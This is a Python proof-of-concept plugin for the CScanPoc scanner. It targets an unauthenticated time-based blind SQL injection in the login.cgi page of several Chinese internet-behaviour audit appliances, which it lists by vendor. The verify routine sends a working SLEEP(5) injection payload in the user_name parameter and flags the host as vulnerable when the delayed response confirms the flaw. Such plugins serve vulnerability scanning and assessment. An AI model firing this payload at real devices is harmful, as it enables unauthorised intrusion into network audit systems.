# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'Network_Security_Audit_System_0001'  # 平台漏洞编号，留空
    name = '上网行为审计系统 通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-23'  # 漏洞公布时间
    desc = '''
        13家厂商（17种设备）网上行为（审计）设备系统通用型SQL注入（无需登录涉及网神&启明&神舟数码等）。
        天玥网络安全审计系统
        Netoray NSG 上网行为管理系统
        Netoray SMB 企业易网通
        Netoray NSG 上网行为管理系统
        Netoray TOG 莱克斯带宽管理系统 V5.0
        网神信息技术（北京）股份有限公司：
        poweraegis 5500 上网行为管理系统
        InforCube NSG 上讯上网行为管理系统
        神州数码上网行为管理系统
        VOLANS SR上网行为审计网关
        瑞星上网行为管理系统
        网御上网行为管理系统 Leadsec ACM
        网睿兴安日志系统
        艺创专业上网行为管理设备 e-strong ibm
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '上网行为审计系统'  # 漏洞应用名称
    product_version = '上网行为审计系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '90166eb7-adfc-4c34-9cf9-188740a4717d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://wooyun.org/bugs/wooyun-2015-0122195
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            code1, head, res, errcode, _ = hh.http(arg)
            true_time = time.time() - start_time1
            # print true_time
            start_time2 = time.time()
            payload = "/login.cgi?act=login&user_name=admin%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))HcCu)%20AND%20%27zMcG%27=%27zMcG&user_pwd=admin&lang=zh_CN.UTF-8&t=0.9077004473656416&loginflag=1&ajax_rnd=01533054909668862846&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
            target = arg + payload
            code2, head, res, errcode, _ = hh.http(target)
            flase_time = time.time() - start_time2

            if code1 == 200 and code2 == 200 and true_time < 2 and flase_time > 5:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
